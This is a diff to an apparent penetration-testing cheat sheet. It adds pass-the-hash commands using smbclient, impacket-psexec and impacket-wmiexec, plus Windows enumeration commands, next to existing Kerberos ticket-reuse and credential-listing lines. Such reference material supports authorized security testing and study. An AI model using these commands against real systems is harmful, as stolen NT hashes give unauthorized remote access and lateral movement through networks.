@@ -1836,6 +1836,7 @@ smbclient "\\\\<RHOST>\<SHARE>"
 smbclient \\\\<RHOST>\\<SHARE> -U '<USERNAME>' --socket-options='TCP_NODELAY IPTOS_LOWDELAY SO_KEEPALIVE SO_RCVBUF=131072 SO_SNDBUF=131072' -t 40000
 smbclient --no-pass //<RHOST>/<SHARE>
 smbclient //IP//Folder -U 'USER%PASS' -c "dir"
+smbclient \\\\IP\\Folder -U USER --pw-nt-hash HASH
 ```
 If NT_STATUS_CONNECTION_DISCONNECTED 
 
@@ -6587,6 +6588,7 @@ If its pwned then use psexec.py
 python psexec.py USER@IP
 impacket-psexec administrator@IP
 psexec USER@IP -hashes :HASH_NT
+impacket-psexec -hashes 00000000000000000000000000000000:HASH USER@IP
 psexec WORKGROUP/USER@PIP cmd.exe
 impacket-psexec WORKGROUP\username@IP cmd.exe
 ```
@@ -7017,6 +7019,7 @@ export KRB5CCNAME=<USERNAME>.ccache
 impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
+impacket-wmiexec -hashes 00000000000000000000000000000000:HASH User@IP
 ```
 
 ###### Ask and inject the Ticket
@@ -7086,6 +7089,7 @@ export KRB5CCNAME=<USERNAME>.ccache
 impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
+impacket-wmiexec -hashes 00000000000000000000000000000000:HASH User@IP
 ```
 
 ###### Using Ticket on Windows
@@ -7136,6 +7140,7 @@ export KRB5CCNAME=<USERNAME>.ccache
 impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
+impacket-wmiexec -hashes 00000000000000000000000000000000:HASH User@IP
 ```
 
 ##### mimikatz Examples
@@ -7204,6 +7209,7 @@ export KRB5CCNAME=<USERNAME>.ccache
 impacket-psexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 impacket-smbexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
 impacket-wmiexec <DOMAIN>/<USERNAME>@<RHOST> -k -no-pass
+impacket-wmiexec -hashes 00000000000000000000000000000000:HASH User@IP
 ```
 
 ##### mimikatz Examples
@@ -8349,6 +8355,8 @@ vaultcmd /list //credentials
 Get-ADPrincipalGroupMembership USERNAME | Format-Table -auto  // User group
 Get-ADPrincipalGroupMembership username | select
 gci -force //powershell ls -al
+route print
+netstat -ano
 ```
 ###### Create windows user
 
@@ -8567,7 +8575,8 @@ powershell ls -force    // show all hidden files
 ##### Show installed Applications
 
 ```c
-PS C:\> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
+PS C:\> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname //x32
+Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname  //x64
 ```
 
 ##### User Handling
